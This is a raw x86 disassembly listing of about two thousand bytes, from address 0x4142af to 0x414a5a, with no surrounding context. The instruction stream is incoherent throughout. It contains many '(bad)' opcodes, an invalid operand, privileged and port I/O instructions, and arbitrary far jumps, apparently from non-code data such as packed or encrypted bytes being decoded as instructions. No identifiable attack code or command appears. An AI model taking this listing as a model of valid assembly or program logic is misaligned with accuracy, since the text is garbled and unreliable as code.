  4142af:	ins    BYTE PTR es:[edi],dx
  4142b0:	mov    ds:0x1605faef,al
  4142b5:	sbb    edx,DWORD PTR [edx]
  4142b7:	sbb    eax,0x23c9ce64
  4142bc:	(bad)  
  4142bd:	push   esi
  4142be:	test   BYTE PTR [esi],0x7b
  4142c1:	popa   
  4142c2:	mov    ds:0x8e0a9592,al
  4142c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142c8:	jmp    0x41425a
  4142ca:	jmp    0xd92639d6
  4142cf:	popa   
  4142d0:	mov    al,0x54
  4142d2:	and    eax,0xed3ca4ca
  4142d7:	and    al,0x11
  4142d9:	les    ecx,FWORD PTR [eax+esi*2]
  4142dc:	shl    BYTE PTR [edi+0x1c074f67],1
  4142e2:	mov    al,ds:0xcbf83d17
  4142e7:	mov    edi,0xceb7eac8
  4142ec:	sub    ch,BYTE PTR [edi-0xb928fc3]
  4142f2:	xor    eax,0x829725d1
  4142f7:	mov    WORD PTR [eax],gs
  4142f9:	adc    edx,esp
  4142fb:	mov    al,ds:0xe62b0cf
  414300:	jge    0x41435d
  414302:	xor    ebp,DWORD PTR [edx-0x32edaed7]
  414308:	int    0x4
  41430a:	or     ebp,edi
  41430c:	xchg   ebp,eax
  41430d:	dec    eax
  41430e:	pop    ds
  41430f:	adc    eax,0x701b2ab
  414314:	mov    DWORD PTR [esi],edi
  414316:	push   esp
  414317:	test   DWORD PTR [eax],eax
  414319:	xlat   BYTE PTR ds:[ebx]
  41431a:	out    dx,eax
  41431b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41431c:	add    DWORD PTR [esi],esi
  41431e:	dec    ebx
  41431f:	daa    
  414320:	mov    al,ds:0x9327df6e
  414325:	pop    ss
  414326:	test   DWORD PTR [edi-0x1bea03fc],ebx
  41432c:	inc    esi
  41432d:	add    dh,al
  41432f:	daa    
  414330:	shrd   DWORD PTR [ecx+esi*2+0x7d7846f9],esp,0x98
  414339:	fwait
  41433a:	fs cmp al,0x5
  41433d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41433e:	mov    ebp,0x1ce3d72e
  414343:	fidiv  DWORD PTR [edi+ebp*1-0x45]
  414347:	cdq    
  414348:	dec    edi
  414349:	bound  ebx,QWORD PTR [ebx+ebx*1]
  41434c:	cmp    eax,0x4dea50d6
  414351:	sub    DWORD PTR [eax],ecx
  414353:	adc    DWORD PTR [edi+0x2393cc7f],ebp
  414359:	xchg   esp,eax
  41435a:	dec    ebp
  41435b:	jecxz  0x414300
  41435d:	outs   dx,BYTE PTR ds:[esi]
  41435e:	add    ch,BYTE PTR [ecx]
  414360:	or     BYTE PTR [eax+0x22],dl
  414363:	lods   al,BYTE PTR ds:[esi]
  414364:	loopne 0x4143cf
  414366:	in     eax,0x30
  414368:	bound  ecx,QWORD PTR [ebx-0x31]
  41436b:	mov    ebx,0x4274b8b0
  414370:	mov    bl,0x33
  414372:	in     al,0x60
  414374:	sbb    DWORD PTR [ebx],esp
  414376:	push   esi
  414377:	pop    edi
  414378:	mov    ah,0x29
  41437a:	add    eax,edx
  41437c:	and    eax,0x288f3b25
  414381:	add    ebp,DWORD PTR [ebx-0x23]
  414384:	ds push esi
  414386:	jns    0x414337
  414388:	and    al,0x15
  41438a:	fs sahf 
  41438c:	rol    BYTE PTR [edi-0x1a],1
  41438f:	(bad)  
  414390:	loop   0x4143f9
  414392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414393:	test   al,0xc3
  414395:	mov    bh,0xee
  414397:	call   DWORD PTR [eax+0x17e99591]
  41439d:	adc    eax,DWORD PTR [ebx-0x5c8725fb]
  4143a3:	fcmove st,st(0)
  4143a5:	mov    cl,0xca
  4143a7:	(bad)  
  4143a8:	lock pop ebx
  4143aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143ab:	addr16 inc edx
  4143ad:	mov    ecx,0xe0f0a479
  4143b2:	fs push 0x53423d42
  4143b8:	sbb    BYTE PTR [edi],dl
  4143ba:	push   0xfbc735f0
  4143bf:	push   0x45
  4143c1:	int3   
  4143c2:	sti    
  4143c3:	retf   0xadc3
  4143c6:	stc    
  4143c7:	add    BYTE PTR [ebx-0x6fb2bcc1],al
  4143cd:	ins    DWORD PTR es:[edi],dx
  4143ce:	pop    es
  4143cf:	bound  ecx,QWORD PTR [edi]
  4143d1:	push   edi
  4143d2:	inc    esp
  4143d3:	mov    ds:0xd169ccd5,eax
  4143d8:	mov    ecx,0x113d996d
  4143dd:	test   al,0xd0
  4143df:	leave  
  4143e0:	jo     0x4143ee
  4143e2:	inc    ecx
  4143e3:	rol    DWORD PTR [esi],cl
  4143e5:	stos   WORD PTR es:[edi],ax
  4143e7:	outs   dx,DWORD PTR ds:[esi]
  4143e8:	xchg   ebx,eax
  4143e9:	mov    ecx,0x528cdfbe
  4143ee:	jmp    0xc08c:0xa5d91ec6
  4143f5:	aad    0x2f
  4143f7:	aam    0xbd
  4143f9:	or     ecx,DWORD PTR [edx+0xadf225f]
  4143ff:	mov    ah,0xda
  414401:	mov    dh,0xd2
  414403:	jecxz  0x4143c2
  414405:	ja     0x4143f2
  414407:	not    DWORD PTR [esi]
  414409:	in     eax,dx
  41440a:	es push 0x6285c328
  414410:	adc    al,0xf0
  414412:	inc    ecx
  414413:	add    esi,ebx
  414415:	mov    bl,0x54
  414417:	sbb    al,0xbc
  414419:	adc    dl,BYTE PTR [edx-0x3c3020d]
  41441f:	push   ecx
  414420:	add    eax,0x6b3499bd
  414425:	push   ebp
  414426:	out    0xff,al
  414428:	ins    BYTE PTR es:[edi],dx
  414429:	sub    eax,0xd0031511
  41442e:	jne    0x414410
  414430:	or     edi,0xffffffb9
  414433:	enter  0x70be,0xee
  414437:	jecxz  0x414400
  414439:	ins    BYTE PTR es:[edi],dx
  41443a:	je     0x4143d3
  41443c:	adc    al,0x84
  41443e:	mov    ebp,0xfb534568
  414443:	(bad)  
  414444:	jnp    0x41441f
  414446:	add    eax,edx
  414448:	pushf  
  414449:	inc    edx
  41444a:	(bad)  
  41444b:	pop    ds
  41444c:	cmp    BYTE PTR [ecx-0x4],0x31
  414450:	pop    es
  414451:	jle    0x414499
  414453:	rcl    bh,1
  414455:	push   ecx
  414456:	xchg   edx,eax
  414457:	cmp    bh,BYTE PTR [edx-0x24f9fc34]
  41445d:	out    0x3a,eax
  41445f:	push   ebx
  414460:	sub    DWORD PTR [esi],eax
  414462:	jle    0x4144c2
  414464:	push   edi
  414465:	mov    BYTE PTR [ebx],bh
  414467:	sub    al,0x4a
  414469:	iret   
  41446a:	loope  0x414406
  41446c:	jecxz  0x4144d3
  41446e:	xchg   edx,eax
  41446f:	jmp    0x1864:0xc5c818e8
  414476:	dec    esp
  414477:	pop    ebp
  414478:	loope  0x414457
  41447a:	aad    0xf
  41447c:	adc    eax,ecx
  41447e:	jle    0x41442f
  414480:	dec    edx
  414481:	cmp    al,0xf3
  414483:	out    dx,eax
  414484:	pushf  
  414485:	pop    edi
  414486:	cmp    esi,DWORD PTR [edx]
  414488:	push   esp
  414489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41448a:	push   ecx
  41448b:	aaa    
  41448c:	cmp    esi,DWORD PTR [ebp+0x3491a151]
  414492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414493:	sar    BYTE PTR [edi],0x93
  414496:	leave  
  414497:	and    cl,ch
  414499:	loop   0x414453
  41449b:	lea    esp,[edx-0x5a84fc33]
  4144a1:	ds inc edi
  4144a3:	retf   0x46f7
  4144a6:	shr    DWORD PTR [esi],1
  4144a8:	jmp    FWORD PTR [edx]
  4144aa:	sbb    dh,BYTE PTR [esi+eax*1]
  4144ad:	add    bl,BYTE PTR [eax+esi*4+0x50b7c1b1]
  4144b4:	in     al,0x27
  4144b6:	jne    0x4144ef
  4144b8:	fcom   DWORD PTR [eax+0x2fe40823]
  4144be:	cmp    ch,ch
  4144c0:	lahf   
  4144c1:	adc    DWORD PTR [eax],ebp
  4144c3:	iret   
  4144c4:	repz iret 
  4144c6:	div    DWORD PTR [esi]
  4144c8:	sbb    edi,DWORD PTR ds:0xbe495f4c
  4144ce:	ret    
  4144cf:	add    dh,BYTE PTR [ebp+0x6f591e5]
  4144d5:	mov    ch,BYTE PTR [ebx+0x5a]
  4144d8:	mov    al,0xa3
  4144da:	jmp    0x4aa8:0xd916b56d
  4144e1:	outs   dx,BYTE PTR ds:[esi]
  4144e2:	adc    al,0xa1
  4144e4:	pusha  
  4144e5:	test   al,0x96
  4144e7:	dec    esi
  4144e8:	or     edi,ebp
  4144ea:	mov    esi,0x328e1ad9
  4144ef:	xchg   ecx,eax
  4144f0:	bound  ebp,QWORD PTR [ecx-0x70]
  4144f3:	test   eax,0x434d50d7
  4144f8:	mov    esi,0xb1c2f535
  4144fd:	push   ds
  4144fe:	adc    BYTE PTR [ebx+eiz*4-0x58ecda7b],ah
  414505:	fmul   DWORD PTR [edi]
  414507:	cmp    DWORD PTR [esi+0x5d],esi
  41450a:	out    dx,eax
  41450b:	sub    DWORD PTR [ecx+ecx*1+0x258a0b93],edx
  414512:	pop    ds
  414513:	bound  edi,QWORD PTR [eax]
  414515:	daa    
  414516:	iretw  
  414518:	stos   BYTE PTR es:[edi],al
  414519:	in     al,0x70
  41451b:	aad    0x67
  41451d:	jle    0x41456b
  41451f:	mov    ebx,0xdf74c7ab
  414524:	pop    edi
  414525:	leave  
  414526:	sub    ch,BYTE PTR [eax-0x273f0173]
  41452c:	sbb    edi,eax
  41452e:	(bad)  
  41452f:	mov    ds:0x36bbbbca,al
  414534:	ins    BYTE PTR es:[edi],dx
  414535:	loop   0x414508
  414537:	dec    eax
  414538:	fnstcw WORD PTR [ecx+0x18]
  41453b:	(bad)  
  41453c:	jbe    0x41453e
  41453e:	cmp    dh,ah
  414540:	pop    esp
  414541:	mov    cl,BYTE PTR [ebx+eiz*4+0x701c0fd2]
  414548:	xor    dl,BYTE PTR [edi-0x6fab35c9]
  41454e:	jmp    0x41454e
  414550:	xor    BYTE PTR [edx-0x19],0xf5
  414554:	xor    ebp,DWORD PTR [edi+ecx*1+0x43bf9564]
  41455b:	sbb    BYTE PTR [ecx],dh
  41455d:	push   0x6a2c2d32
  414562:	imul   DWORD PTR [eax]
  414564:	mov    ds:0x87e9e219,eax
  414569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41456a:	jl     0x414500
  41456c:	add    al,0xb1
  41456e:	jecxz  0x414513
  414570:	test   al,0x93
  414572:	mov    esi,edx
  414574:	xchg   BYTE PTR [ebx],cl
  414576:	push   ebp
  414577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414578:	popf   
  414579:	icebp  
  41457a:	sahf   
  41457b:	jb     0x414547
  41457d:	lods   al,BYTE PTR ds:[esi]
  41457e:	aad    0x99
  414580:	lahf   
  414581:	pop    ss
  414582:	sub    ebp,DWORD PTR [ecx-0x5b96c213]
  414588:	lods   eax,DWORD PTR ds:[esi]
  414589:	pop    esp
  41458a:	idiv   BYTE PTR [edx-0xa]
  41458d:	sbb    esp,DWORD PTR [edx]
  41458f:	jnp    0x4145bd
  414591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414592:	imul   esi,DWORD PTR [esi-0x18],0xffffffee
  414596:	jmp    0xe763:0xea2e87c9
  41459d:	push   ecx
  41459e:	inc    edx
  41459f:	imul   edi,DWORD PTR [esi-0x38],0x6f120c7c
  4145a6:	mov    WORD PTR [eax],es
  4145a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145a9:	lods   al,BYTE PTR ds:[esi]
  4145aa:	mov    dh,0xfc
  4145ac:	inc    esi
  4145ad:	or     al,dh
  4145af:	xor    eax,0x7b32bad8
  4145b4:	bound  esi,QWORD PTR [eax-0x80]
  4145b7:	stos   DWORD PTR es:[edi],eax
  4145b8:	push   esi
  4145b9:	pushf  
  4145ba:	xchg   ecx,eax
  4145bb:	out    0x8,al
  4145bd:	std    
  4145be:	imul   edi,DWORD PTR [eax+0x11],0x22
  4145c2:	sub    ebp,DWORD PTR [ecx+ecx*1-0x78]
  4145c6:	xchg   esp,eax
  4145c7:	and    BYTE PTR [edi+0x70],dl
  4145ca:	loope  0x4145f8
  4145cc:	jbe    0x41461f
  4145ce:	adc    al,0xa0
  4145d0:	and    BYTE PTR [ecx],cl
  4145d2:	dec    edx
  4145d3:	in     eax,0xfd
  4145d5:	push   ss
  4145d6:	in     al,dx
  4145d7:	mov    WORD PTR [esi],es
  4145d9:	sahf   
  4145da:	lahf   
  4145db:	(bad)  
  4145dd:	ucomiss xmm5,DWORD PTR [ebp-0x80]
  4145e1:	push   edx
  4145e2:	rcl    DWORD PTR ds:0x271e49fa,cl
  4145e8:	loopne 0x4145ed
  4145ea:	and    eax,0x5436ac6c
  4145ef:	fcomp  QWORD PTR [ebx]
  4145f1:	jbe    0x414609
  4145f3:	popa   
  4145f4:	add    dl,bl
  4145f6:	adc    al,0x5
  4145f8:	lds    di,DWORD PTR [eax]
  4145fb:	lahf   
  4145fc:	mov    ds:0x86bb114f,eax
  414601:	cmp    eax,DWORD PTR [edi-0x4432e4cb]
  414607:	aad    0x30
  414609:	(bad)  
  41460a:	daa    
  41460b:	sub    bl,dh
  41460d:	in     eax,0x32
  41460f:	xchg   edx,eax
  414610:	pop    ecx
  414611:	add    edx,0x6262c05b
  414617:	mov    al,0x85
  414619:	aad    0x4b
  41461b:	not    BYTE PTR [ebx]
  41461d:	call   0xdc2e:0xbe0e9f8a
  414624:	imul   esi,DWORD PTR [ecx-0x7e9b5420],0x25
  41462b:	mov    al,ds:0x34710ab9
  414630:	rcr    DWORD PTR [edx-0x61881006],1
  414636:	inc    esi
  414637:	adc    edx,DWORD PTR [ebp+0x6c]
  41463a:	jne    0x414603
  41463c:	adc    BYTE PTR [edi+0x1b],dh
  41463f:	pushf  
  414640:	mov    ah,0x17
  414642:	mov    dh,0x1c
  414644:	enter  0x10eb,0xa9
  414648:	xchg   esi,eax
  414649:	mov    edx,0x504ba97
  41464e:	(bad)  
  41464f:	sahf   
  414650:	aad    0x6e
  414652:	mov    ds:0x603e58e,eax
  414657:	inc    edi
  414658:	fnstcw WORD PTR [ecx+0x31b69777]
  41465e:	ret    0x8b8e
  414661:	std    
  414662:	mov    ecx,cs
  414664:	pop    es
  414665:	inc    edx
  414666:	dec    ecx
  414667:	dec    ebp
  414668:	or     al,0x1a
  41466a:	push   eax
  41466b:	mov    esp,0x95dfe487
  414670:	and    eax,0x67faf258
  414675:	cs add eax,0x3f70f500
  41467b:	pop    es
  41467c:	and    BYTE PTR [edi],dh
  41467e:	std    
  41467f:	pop    ss
  414680:	es (bad) 
  414682:	idiv   BYTE PTR [edi-0x18]
  414685:	cmp    cl,BYTE PTR [ebp-0x80]
  414688:	cmp    BYTE PTR [ecx+0x55d3c3f],ah
  41468e:	inc    ebx
  41468f:	xchg   esp,eax
  414690:	out    0xb3,al
  414692:	xlat   BYTE PTR ds:[ebx]
  414693:	pusha  
  414694:	xlat   BYTE PTR ds:[ebx]
  414695:	dec    esp
  414696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414697:	and    dl,BYTE PTR [esi+0x7009a533]
  41469d:	jge    0x41471b
  41469f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146a0:	loope  0x4146ed
  4146a2:	cmp    esi,DWORD PTR [esi+0x63]
  4146a5:	adc    DWORD PTR [ebp-0x40],0x36
  4146a9:	xchg   DWORD PTR [edx+0xb],ebx
  4146ac:	std    
  4146ad:	icebp  
  4146ae:	add    edi,esp
  4146b0:	outs   dx,DWORD PTR ds:[esi]
  4146b1:	adc    BYTE PTR [ebx+0x5b],bh
  4146b4:	imul   eax,DWORD PTR [ebx+0x4c],0xffffffc4
  4146b8:	or     eax,0x9e458a4f
  4146bd:	fiadd  WORD PTR [ecx+0x389d4b1b]
  4146c3:	mov    esi,0x7b4b5fbb
  4146c8:	ret    
  4146c9:	out    0x53,eax
  4146cb:	lods   eax,DWORD PTR ds:[esi]
  4146cc:	mov    WORD PTR [edi],ds
  4146ce:	sar    ecx,1
  4146d0:	ja     0x414726
  4146d2:	sub    ebx,DWORD PTR [eax+eiz*2-0x47]
  4146d6:	fxch   st(6)
  4146d8:	push   ebx
  4146d9:	cmp    eax,ecx
  4146db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146dc:	xchg   edx,eax
  4146dd:	js     0x4146f5
  4146df:	call   0x25611555
  4146e4:	mov    al,ds:0x31faed40
  4146e9:	dec    esp
  4146ea:	sahf   
  4146eb:	scas   al,BYTE PTR es:[edi]
  4146ec:	adc    BYTE PTR [edi+0x3d3ae4d4],dh
  4146f2:	inc    esi
  4146f3:	ss pop edx
  4146f5:	jge    0x4146ce
  4146f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146f8:	inc    ebp
  4146f9:	ja     0x4146fa
  4146fb:	and    dh,BYTE PTR [edx]
  4146fd:	push   eax
  4146fe:	dec    esp
  4146ff:	mov    dl,0x52
  414701:	sub    al,0x6b
  414703:	sub    al,0x5a
  414705:	adc    dl,al
  414707:	sub    al,0xf8
  414709:	std    
  41470a:	dec    esi
  41470b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41470c:	inc    esi
  41470d:	push   ds
  41470e:	out    0x9c,al
  414710:	dec    ebp
  414711:	push   ss
  414712:	jmp    0x4146d3
  414714:	xchg   esi,eax
  414715:	jmp    0x4146d4
  414717:	popf   
  414718:	out    dx,al
  414719:	das    
  41471a:	adc    DWORD PTR [edi+0x49],eax
  41471d:	cmp    esp,DWORD PTR [eax]
  41471f:	sub    dh,BYTE PTR [ebx+0x379b6f46]
  414725:	retf   0x8a7d
  414728:	pop    eax
  414729:	aaa    
  41472a:	adc    edi,ebx
  41472c:	xor    DWORD PTR [edi+0x23],esp
  41472f:	xor    al,BYTE PTR [edi+0x41]
  414732:	add    al,0x69
  414734:	mov    bl,0xfe
  414736:	push   cs
  414737:	popf   
  414738:	test   BYTE PTR [ecx+0x38250f2e],0xbf
  41473f:	mov    ebp,0xce97b542
  414744:	popa   
  414745:	xchg   ebx,eax
  414746:	(bad)  
  414747:	shr    esp,1
  414749:	aas    
  41474a:	rol    BYTE PTR ds:0x890c320c,0xb0
  414751:	stos   DWORD PTR es:[edi],eax
  414752:	adc    al,BYTE PTR [eax+eiz*8-0x5a]
  414756:	xlat   BYTE PTR ds:[ebx]
  414757:	fiadd  DWORD PTR [edx+0x3a]
  41475a:	sub    esp,DWORD PTR [edx]
  41475c:	ja     0x41477e
  41475e:	fmul   QWORD PTR ds:0x17fcda4a
  414764:	mov    ebp,DWORD PTR [ecx]
  414766:	imul   edx,DWORD PTR [ebp-0x58],0xffffff82
  41476a:	and    al,0x38
  41476c:	mov    cl,0x2
  41476e:	sub    BYTE PTR [ebx-0x3b],dl
  414771:	mov    al,ds:0xf3de366
  414776:	add    BYTE PTR [eax+eiz*8-0x7d],bh
  41477a:	scas   eax,DWORD PTR es:[edi]
  41477b:	arpl   WORD PTR ds:0xb63fe575,sp
  414781:	fsubrp st(5),st
  414783:	adc    BYTE PTR [esp+ecx*1+0x38c9011f],cl
  41478a:	or     dl,bh
  41478c:	mov    eax,0xecaef10b
  414791:	fistp  DWORD PTR [edx+0x66]
  414794:	sub    al,0xb1
  414796:	ins    DWORD PTR es:[edi],dx
  414797:	enter  0x2a9c,0x4c
  41479b:	fmul   QWORD PTR [edi]
  41479d:	pop    ss
  41479e:	repz sbb al,0x72
  4147a1:	sub    DWORD PTR [edi+ebp*8],ebp
  4147a4:	loope  0x41472b
  4147a6:	jle    0x4147e1
  4147a8:	xlat   BYTE PTR ds:[ebx]
  4147a9:	sub    al,0xe9
  4147ab:	jbe    0x414808
  4147ad:	push   ss
  4147ae:	sbb    eax,0x6e67f6f4
  4147b3:	jp     0x41479e
  4147b5:	stos   DWORD PTR es:[edi],eax
  4147b6:	push   ss
  4147b7:	imul   ebp,ebp,0xffffff90
  4147ba:	add    eax,0x5530f0ab
  4147bf:	cmp    eax,0x7a1bc9f8
  4147c4:	mov    edi,0x472da0f4
  4147c9:	out    0x2e,al
  4147cb:	inc    eax
  4147cc:	push   ebp
  4147cd:	mov    dl,0xd8
  4147cf:	arpl   WORD PTR [edi-0x5640ef24],bp
  4147d5:	pop    ecx
  4147d6:	jo     0x4147f8
  4147d8:	dec    edi
  4147d9:	add    eax,DWORD PTR [ebp+0x388083e5]
  4147df:	jmp    0x149573b
  4147e4:	das    
  4147e5:	call   0x5900:0x3d945a41
  4147ec:	sbb    DWORD PTR [eax-0x1e],ebx
  4147ef:	sbb    BYTE PTR [esi],dl
  4147f1:	inc    edx
  4147f2:	jge    0x414799
  4147f4:	sbb    esp,eax
  4147f6:	shl    BYTE PTR [esi-0x4769e21d],cl
  4147fc:	(bad)  
  4147fd:	out    dx,al
  4147fe:	mov    ?,WORD PTR es:[edx-0x44]
  414802:	mov    esp,0x8634776c
  414807:	xor    DWORD PTR [ebx-0x2ed03c7a],ebp
  41480d:	add    ah,BYTE PTR [esi-0x31]
  414810:	out    0xbd,eax
  414812:	ins    BYTE PTR es:[edi],dx
  414813:	sub    al,0xe2
  414815:	sub    al,0xaf
  414817:	xor    edx,esp
  414819:	js     0x4147f8
  41481b:	xor    DWORD PTR [ecx],ebx
  41481d:	(bad)  
  41481e:	inc    BYTE PTR [edx]
  414820:	xchg   edx,esp
  414822:	mov    ds:0x8969a207,al
  414827:	xor    eax,DWORD PTR [esi-0x5d3e8173]
  41482d:	lods   al,BYTE PTR ds:[esi]
  41482e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41482f:	sbb    al,0x11
  414831:	fcomp  QWORD PTR [ebx+0x10d37dbb]
  414837:	add    al,0x86
  414839:	push   0xffffffff
  41483b:	xchg   ebp,eax
  41483c:	push   eax
  41483d:	ins    BYTE PTR es:[edi],dx
  41483e:	retf   
  41483f:	clc    
  414840:	or     BYTE PTR [ebp-0x53d08216],bh
  414846:	cmp    ebp,DWORD PTR [esi+ecx*4+0x3a]
  41484a:	js     0x41480c
  41484c:	xor    BYTE PTR [edx],bl
  41484e:	xchg   ebx,eax
  41484f:	mov    DWORD PTR [ebx+0x2ae5e3ee],0x8a3d0183
  414859:	lock adc al,0x16
  41485c:	jae    0x4148ad
  41485e:	jg     0x414861
  414860:	xlat   BYTE PTR ds:[ebx]
  414861:	sbb    ah,BYTE PTR ds:0xfd8112e9
  414867:	pop    eax
  414868:	mov    edx,edi
  41486a:	clc    
  41486b:	fadd   QWORD PTR [ebp+eax*2+0xeae4ddc]
  414872:	loope  0x41482d
  414874:	push   eax
  414875:	scas   eax,DWORD PTR es:[edi]
  414876:	leave  
  414877:	ss in  eax,0xdf
  41487a:	or     al,0x1a
  41487c:	pop    edx
  41487d:	inc    ebp
  41487e:	push   0xffffffd7
  414880:	cdq    
  414881:	xor    eax,0x326f0d14
  414886:	mov    ch,0xeb
  414888:	pop    ss
  414889:	dec    ebx
  41488a:	dec    esp
  41488b:	aaa    
  41488c:	sub    dh,BYTE PTR [ebx+0x49]
  41488f:	push   ds
  414890:	mov    edx,0xcf9c7958
  414895:	test   DWORD PTR [edi-0x45],eax
  414898:	mov    cl,0x35
  41489a:	xlat   BYTE PTR ss:[ebx]
  41489c:	mov    edi,0x31019b40
  4148a1:	aaa    
  4148a2:	adc    eax,0x59ee0ebf
  4148a7:	inc    edx
  4148a8:	cwde   
  4148a9:	mov    eax,ds:0xab2b1ce1
  4148ae:	cmp    eax,0x9808b61c
  4148b3:	shr    ecx,1
  4148b5:	hlt    
  4148b6:	fdiv   DWORD PTR [edx]
  4148b8:	stc    
  4148b9:	repnz add dl,BYTE PTR [edx]
  4148bc:	add    eax,0x4a57616c
  4148c1:	ins    BYTE PTR es:[edi],dx
  4148c2:	adc    eax,0x63eeadc9
  4148c7:	xchg   BYTE PTR [edi+ebp*1+0x36eb7b34],al
  4148ce:	in     eax,0x76
  4148d0:	lods   al,BYTE PTR ds:[esi]
  4148d1:	xlat   BYTE PTR ds:[ebx]
  4148d2:	mov    eax,ds:0x612f775
  4148d7:	rcl    BYTE PTR [ecx+0x60b2ef05],0x54
  4148de:	inc    ecx
  4148df:	add    BYTE PTR [esi-0x3bcc7671],bl
  4148e5:	xor    al,BYTE PTR [edi-0x2f967169]
  4148eb:	sti    
  4148ec:	push   cs
  4148ed:	mov    dl,bl
  4148ef:	inc    edx
  4148f0:	mov    BYTE PTR [edx],ah
  4148f2:	cmp    ah,bh
  4148f4:	aaa    
  4148f5:	xor    BYTE PTR [ebx-0x62],dh
  4148f8:	outs   dx,DWORD PTR ds:[esi]
  4148f9:	(bad)  
  4148fa:	lea    ebp,[edx+0x7dc2ed79]
  414900:	aas    
  414901:	mov    ds:0xfb9449ff,al
  414906:	jle    0x414933
  414908:	std    
  414909:	fwait
  41490a:	adc    DWORD PTR [eax+0x2c],esi
  41490d:	pushf  
  41490e:	mov    edi,DWORD PTR [edi]
  414910:	(bad)  
  414911:	mov    ebp,0x80633931
  414916:	dec    ebp
  414917:	lds    ecx,FWORD PTR [edi+0x1]
  41491a:	(bad)  
  41491b:	mov    dh,0xad
  41491d:	aaa    
  41491e:	mov    DWORD PTR [eax-0x5a99ff69],edx
  414924:	les    eax,FWORD PTR [ebx+esi*8]
  414927:	pop    esp
  414928:	lds    ebp,FWORD PTR [ecx+0x7]
  41492b:	inc    ebx
  41492c:	out    0x62,al
  41492e:	adc    BYTE PTR [edx+eax*2],bh
  414931:	and    edx,DWORD PTR [eax]
  414933:	mov    ch,BYTE PTR [edx+0x6dc99aa8]
  414939:	jbe    0x4148dd
  41493b:	imul   edi,DWORD PTR [ebx+0x2a],0xffffff82
  41493f:	das    
  414940:	xchg   ebx,eax
  414941:	adc    bl,BYTE PTR [eax+0x4b4b00c]
  414947:	sti    
  414948:	mov    dh,0x2
  41494a:	ret    0xfbac
  41494d:	stos   DWORD PTR es:[edi],eax
  41494e:	imul   edx,DWORD PTR ds:0x7627c635,0x94523bbd
  414958:	dec    ecx
  414959:	push   0xffffffba
  41495b:	push   esi
  41495c:	push   0x65
  41495e:	rol    BYTE PTR [eax-0x5f],cl
  414961:	cld    
  414962:	lock adc esp,ecx
  414965:	mov    ds:0x77208423,al
  41496a:	add    eax,0xf5b5f028
  41496f:	or     eax,0x5439ebcb
  414974:	rol    DWORD PTR [ebp-0x4],cl
  414977:	push   es
  414978:	jecxz  0x414916
  41497a:	mul    BYTE PTR [edi]
  41497c:	stc    
  41497d:	add    al,0x76
  41497f:	shr    DWORD PTR [esi],0xc9
  414982:	pop    ds
  414983:	push   ebp
  414984:	ds inc ebx
  414986:	outs   dx,DWORD PTR ds:[esi]
  414987:	cmp    al,0x6a
  414989:	neg    DWORD PTR [ebx-0x68]
  41498c:	xchg   edi,eax
  41498d:	add    ebx,DWORD PTR [ebx+ebp*1-0x333d9be2]
  414994:	test   ecx,eax
  414996:	add    ecx,DWORD PTR [edi-0x1de3ba26]
  41499c:	mov    dl,0x5f
  41499e:	shl    bl,cl
  4149a0:	sub    dl,BYTE PTR [edx-0x18]
  4149a3:	xchg   esi,eax
  4149a4:	xchg   edi,eax
  4149a5:	push   0x5be444cd
  4149aa:	dec    BYTE PTR [esi+0x2c]
  4149ad:	call   0x53f4:0x994ffd71
  4149b4:	out    dx,al
  4149b5:	mov    esp,0xd185478c
  4149ba:	jmp    0x414966
  4149bc:	sub    cl,BYTE PTR [edi-0x103de126]
  4149c2:	rcl    BYTE PTR [esi-0x4],1
  4149c5:	jle    0x4149ff
  4149c7:	jb     0x414a43
  4149c9:	inc    ecx
  4149ca:	mov    dh,0xea
  4149cc:	aad    0xc5
  4149ce:	in     eax,dx
  4149cf:	push   esp
  4149d0:	mov    al,ds:0xb7bfe9cf
  4149d5:	retf   0x2cb8
  4149d8:	(bad)  
  4149da:	dec    DWORD PTR [ebp-0x1771382]
  4149e0:	repz mov bl,0xd4
  4149e3:	lock cmp al,0x73
  4149e6:	icebp  
  4149e7:	jns    0x41498a
  4149e9:	mov    edi,0x659d97a3
  4149ee:	sub    al,0xb2
  4149f0:	(bad)  
  4149f1:	or     edx,esi
  4149f3:	stos   DWORD PTR es:[edi],eax
  4149f4:	jle    0x4149f4
  4149f6:	lods   al,BYTE PTR ds:[esi]
  4149f7:	mov    ebx,0x754377af
  4149fc:	mov    DWORD PTR [ebx+0xec9b596],ecx
  414a02:	popa   
  414a03:	mov    ds:0x25612447,al
  414a08:	loop   0x4149c5
  414a0a:	dec    esi
  414a0b:	test   DWORD PTR [esi+0x2e],ebp
  414a0e:	cli    
  414a0f:	jg     0x414a68
  414a11:	mov    fs,WORD PTR [ebp-0x57]
  414a14:	es call 0xc24b2ee
  414a1a:	fild   QWORD PTR [ecx]
  414a1c:	out    dx,eax
  414a1d:	push   ebx
  414a1e:	or     eax,0xbb876444
  414a23:	cmc    
  414a24:	jmp    0x414a20
  414a26:	inc    ebx
  414a27:	test   eax,0x46069fac
  414a2c:	cmp    al,bl
  414a2e:	push   0xffffffac
  414a30:	or     dl,BYTE PTR [ebx+0x5f491c4d]
  414a36:	inc    eax
  414a37:	xchg   ecx,eax
  414a38:	sub    al,0x88
  414a3a:	cmp    dl,cl
  414a3c:	js     0x414a07
  414a3e:	add    eax,0x3ec52b2
  414a43:	mov    edx,0xa75bd6dc
  414a48:	mov    al,ds:0xe98e5654
  414a4d:	mov    WORD PTR [ecx-0x77],ss
  414a50:	aam    0xe4
  414a52:	hlt    
  414a53:	es out dx,eax
  414a55:	mov    eax,ds:0x6615f1d2
  414a5a:	fist   WORD PTR [edx+0x40]
